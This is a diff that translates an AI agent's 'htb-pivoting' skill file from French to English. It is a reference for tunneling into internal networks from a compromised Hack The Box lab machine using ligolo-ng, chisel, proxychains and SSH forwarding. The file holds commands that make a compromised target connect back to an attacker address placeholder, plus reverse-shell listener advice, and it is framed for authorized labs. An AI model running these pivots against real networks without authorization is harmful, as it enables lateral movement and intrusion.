@@ -1,71 +1,71 @@
 ---
 name: htb-pivoting
 description: >
-  Pivoting et tunneling vers des réseaux internes non routables sur un lab HTB
-  (Pro Labs, multi-machines) ou environnement autorisé. À déclencher quand une
-  machine compromise donne accès à un sous-réseau que votre hôte d'attaque ne
-  peut pas joindre directement. Couvre : ligolo-ng, chisel, proxychains, sshuttle,
-  et le port forwarding SSH. Produit une route/proxy vers le réseau interne pour
-  y relancer scans et exploits.
+  Pivoting and tunneling into non-routable internal networks on an HTB lab
+  (Pro Labs, multi-machine) or authorized environment. Trigger when a compromised
+  machine gives access to a subnet that your attack host cannot reach directly.
+  Covers: ligolo-ng, chisel, proxychains, sshuttle, and SSH port forwarding.
+  Produces a route/proxy into the internal network to relaunch scans and exploits
+  there.
 metadata:
   type: reference
   category: pivoting
-  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
+  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
 ---
 
 # HTB — Pivoting & tunneling
 
-## Quand utiliser cette skill
-Une box compromise (« foothold ») a une seconde interface vers un réseau interne
-(ex. `172.16.x.x`) que vous ne pouvez pas atteindre depuis `tun0`. Il faut
-tunneliser votre trafic à travers elle.
+## When to use this skill
+A compromised box ("foothold") has a second interface to an internal network
+(e.g. `172.16.x.x`) that you cannot reach from `tun0`. You need to tunnel your
+traffic through it.
 
-## Option A — ligolo-ng (recommandé, le plus simple)
+## Option A — ligolo-ng (recommended, the simplest)
 ```bash
-# 1) Chez vous : interface tun + proxy
+# 1) On your side: tun interface + proxy
 sudo ip tuntap add user $USER mode tun ligolo
 sudo ip link set ligolo up
-ligolo-proxy -selfcert          # note le port d'écoute (11601)
+ligolo-proxy -selfcert          # note the listening port (11601)
 
-# 2) Sur la cible : lancer l'agent (transféré via htb-shells)
-./agent -connect VOTRE_IP_tun0:11601 -ignore-cert     # Linux
+# 2) On the target: run the agent (transferred via htb-shells)
+./agent -connect YOUR_tun0_IP:11601 -ignore-cert     # Linux
 #  .\agent.exe -connect ... (Windows)
 
-# 3) Dans la console ligolo : sélectionner la session puis
-#    session   -> choisir l'agent
-#    ifconfig  -> voir le sous-réseau interne
-# 4) Chez vous : router le sous-réseau via l'interface ligolo
+# 3) In the ligolo console: select the session then
+#    session   -> choose the agent
+#    ifconfig  -> view the internal subnet
+# 4) On your side: route the subnet via the ligolo interface
 sudo ip route add 172.16.1.0/24 dev ligolo
-#    puis dans ligolo :  start
+#    then in ligolo:  start
 ```
-Ensuite, `nmap 172.16.1.5` fonctionne directement (pas besoin de proxychains).
+After that, `nmap 172.16.1.5` works directly (no need for proxychains).
 
 ## Option B — chisel (SOCKS proxy)
 ```bash
-# Chez vous (serveur)
+# On your side (server)
 chisel server -p 8000 --reverse
-# Sur la cible (client -> reverse SOCKS)
-./chisel client VOTRE_IP:8000 R:socks
-# Chez vous : router les outils via le proxy 127.0.0.1:1080
+# On the target (client -> reverse SOCKS)
+./chisel client YOUR_IP:8000 R:socks
+# On your side: route tools through the proxy 127.0.0.1:1080
 # /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
 proxychains nmap -sT -Pn 172.16.1.5
 proxychains netexec smb 172.16.1.0/24
 ```
 
-## Option C — SSH (si vous avez des creds SSH sur le pivot)
+## Option C — SSH (if you have SSH creds on the pivot)
 ```bash
 # Dynamic port forward (SOCKS)
-ssh -D 1080 user@PIVOT     # puis proxychains
-# Local port forward (un service précis)
-ssh -L 8080:172.16.1.5:80 user@PIVOT   # 127.0.0.1:8080 -> service interne
+ssh -D 1080 user@PIVOT     # then proxychains
+# Local port forward (a specific service)
+ssh -L 8080:172.16.1.5:80 user@PIVOT   # 127.0.0.1:8080 -> internal service
 # sshuttle (VPN-like, transparent)
 sshuttle -r user@PIVOT 172.16.1.0/24
 ```
 
-## Réflexes
-- **proxychains** ne gère bien que le TCP connect ; avec nmap utiliser `-sT -Pn`
-  (pas de scan SYN/UDP à travers un SOCKS).
-- ligolo évite proxychains : plus fiable pour scans complets et reverse shells.
-- Pour un reverse shell depuis une box interne, ajouter un *listener* côté ligolo
-  (`listener_add`) qui renvoie vers votre `tun0`.
-- Documenter la topologie (quelle box voit quel réseau) au fur et à mesure.
+## Reflexes
+- **proxychains** handles only TCP connect well; with nmap use `-sT -Pn`
+  (no SYN/UDP scan through a SOCKS proxy).
+- ligolo avoids proxychains: more reliable for full scans and reverse shells.
+- For a reverse shell from an internal box, add a *listener* on the ligolo side
+  (`listener_add`) that forwards to your `tun0`.
+- Document the topology (which box sees which network) as you go.
